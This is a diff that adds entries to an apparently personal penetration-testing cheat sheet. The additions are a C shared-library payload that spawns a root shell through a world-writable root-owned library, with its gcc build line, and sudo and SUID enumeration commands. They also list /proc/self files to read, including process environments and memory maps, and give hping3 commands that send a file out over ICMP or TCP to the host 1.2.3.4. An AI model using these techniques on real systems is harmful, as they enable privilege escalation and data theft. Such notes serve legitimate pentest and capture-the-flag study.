@@ -61,12 +61,26 @@ done
     # || setpriv /bin/busybox cat
     ```
 
+- root owned + bad permissions (e.g. 777)
+    - if shared library, compile our own, given called function "foo":
+        ```c
+        #include <stdlib.h>
+        void foo() {
+            system("/bin/sh");
+        }
+        ```
+        ```bash
+        gcc vuln.c -shared -o vuln.so
+        ```
+
 ### enumeration
 
 - ~/opt/privilege-escalation-awesome-scripts-suite/
 - ~/opt/LinEnum/
 
 ```bash
+sudo -l
+
 # suid
 find / -perm -u=s -type f 2>/dev/null
 ```
@@ -74,6 +88,14 @@ find / -perm -u=s -type f 2>/dev/null
 # remote code exection (rce)
 
 - [Hacking with Environment Variables](https://www.elttam.com/blog/env/)
+
+# process pseudo-filesystem
+
+- /proc/self/cmdline
+- /proc/self/cwd
+- /proc/self/environ
+- /proc/self/maps
+   - [!] zero size, but sequentially readable (e.g. `cat`, http request with header `Range: bytes 0-4096`)
 
 # data exfiltration
 
@@ -93,6 +115,13 @@ find / -perm -u=s -type f 2>/dev/null
             | xxd -r -p > loremipsum.txt
         ```
     - https://github.com/leonjza/dnsfilexfer
+- TCP
+    ```bash
+    # ICMP
+    hping3 -E foo.txt -1 -u -i 10 -d 1.2.3.4 95
+    # TCP ACK
+    hping3 -A 1.2.3.4 foo.txt
+    ```
 - URI scheme
     - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
 - bypass URL access rules with redirections (responses with code 3xx)
